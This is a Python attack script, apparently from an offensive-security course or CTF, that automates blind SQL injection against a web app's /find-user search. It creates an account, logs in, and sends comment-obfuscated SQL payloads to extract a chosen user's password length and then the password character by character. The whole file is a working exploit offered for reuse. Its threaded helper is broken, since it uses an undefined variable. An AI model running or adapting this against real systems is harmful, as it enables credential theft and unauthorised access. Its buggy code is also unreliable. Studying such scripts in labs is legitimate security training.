import requests
import re
import argparse
import time
from urllib.parse import quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

"""
(c) Roger Dooley
Reusable Scripts for Security Labs and PoCs

These utilities were developed to support offensive security training, PoC delivery, and CTF workflows.
Free to use, modify, and share for lawful educational or testing purposes. Attribution required if redistributed.
"""

HEADERS_TEMPLATE = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

def create_user(target, username, password):
    data = {
        "name": username,
        "username": username,
        "email": username + "@fake.com",
        "password": password,
        "repeatPassword": password
    }
    response = requests.post(target + '/signup', data=data, timeout=5)
    if response.status_code != 200:
        print(f"[-] Account not created for user {username}...aborting")
        exit()
    return True

def login(target, username, password):
    data = { 
        "username": username,
        "password": password
    }
    session = requests.Session()
    try:
        response = session.post(target + "/login", data=data, timeout=5)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Login error: {e}")
        return None
    if response.status_code != 200:
        print(f"Login failed: {response.status_code}")
        return None
    cookie = session.cookies.get("auth")
    if not cookie:
        print("auth not found in cookies")
        return None
    return cookie

def encode_payload(condition):
    return quote(f"'/**/AND/**/id=({condition})--")

def oracle_fn(expr, target_url, session):
    payload = encode_payload(expr)
    url = f"{target_url}/find-user?u={payload}"
    print(f"[DEBUG] Request URL: {url}")
    proxy = {"http": "http://127.0.0.1:8080"}
    r = session.get(url)
    print(f"[DEBUG] Status: {r.status_code}")
    print(f"[DEBUG] Snippet: {r.text[:500]}")  # show first 500 chars

    soup = BeautifulSoup(r.text, "html.parser")
    h1 = soup.find("h1", string="User search results...")
    if not h1:
        print("[DEBUG] <h1>User search results...</h1> not found")
        return None

    results_section = h1.find_next("div", class_="mt-3 pt-2")
    if not results_section:
        print("[DEBUG] div.mt-3.pt-2 not found after h1")
        return None

    profile_link = results_section.find("a", href=re.compile(r"/profile/(\d+)", re.IGNORECASE))
    if not profile_link:
        print("[DEBUG] No profile link in correct section")
        return None

    match = re.search(r"/profile/(\d+)", profile_link["href"])
    return int(match.group(1)) if match else None


def extract_password_length(field, value, target_url, session):
    print(f"[*] Extracting password length using {field}={value}")
    query = f"SELECT/**/LENGTH(password)/**/FROM/**/users/**/WHERE/**/{field}=$${value}$$"
    result = oracle_fn(query, target_url, session)
    if result:
        print(f"[+] Password length: {result}")
        return result
    else:
        print("[-] No match or target filtered the query.")
        return None

def extract_password(length, field, value, target_url, session):
    print("[*] Extracting password...")
    password = ""
    for i in range(1, length + 1):
        for ascii_code in range(32, 127):
            query = f"SELECT/**/ASCII(SUBSTRING(password,{i},1))/**/FROM/**/users/**/WHERE/**/{field}=$${value}$$"
            result = oracle_fn(query, target_url, session)
            if result == ascii_code:
                password += chr(ascii_code)
                print(f"[char {i}] = {chr(ascii_code)}")
                break
    print(f"[+] Final password: {password}")
    return password

def guess_char(i, field, value, target_url, session):
    for ascii_code in range(32, 127):
        inner_query = f"SELECT/**/ASCII(SUBSTRING(password,{i},1))/**/FROM/**/users/**/WHERE/**/{field}=$${value}$$"
        result = oracle_fn(query, target_url, session)
        if result == ascii_code:
            return (i, chr(ascii_code))
    return (i, '?')


def extract_password_threaded(length, field, value, target_url, session, max_workers=4):
    # Did not try this for the course module so unsure if it works
    # TODO: to try if I have time
    print("[*] Extracting password using threads...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(guess_char, i, field, value, target_url, session) for i in range(1, length + 1)]
    results = sorted([f.result() for f in futures], key=lambda x: x[0])
    password = ''.join(c for _, c in results)
    for i, c in results:
        print(f"[char {i}] = {c}")
    print(f"[+] Final password: {password}")
    return password

def parse_args():
    parser = argparse.ArgumentParser(description="Blind SQLi password extractor")
    parser.add_argument("-t", "--target", required=True, help="Base target URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--username", required=True, help="Username for login")
    parser.add_argument("--password", required=True, help="Password for login")
    parser.add_argument("--field", choices=["username", "email"], required=True, help="Target field to use")
    parser.add_argument("--value", required=True, help="Target field value")
    parser.add_argument("--password-length", action="store_true", help="Extract password length")
    parser.add_argument("--extract-password", action="store_true", help="Extract password characters")
    parser.add_argument("--threaded", action="store_true", help="Use threading for password extraction")
    parser.add_argument("--threads", type=int, default=4, help="Thread count if --threaded is set")
    return parser.parse_args()

def main():
    args = parse_args()
    if create_user(args.target, args.username, args.password):
        auth_cookie = login(args.target, args.username, args.password)
        if not auth_cookie:
            return
        session = requests.Session()
        session.cookies.set("auth", auth_cookie)

        length = None
        if args.password_length or args.extract_password:
            length = extract_password_length(args.field, args.value, args.target, session)
        if args.extract_password and length:
            if args.threaded:
                extract_password_threaded(length, args.field, args.value, args.target, session, max_workers=args.threads)
            else:
                extract_password(length, args.field, args.value, args.target, session)

if __name__ == "__main__":
    main()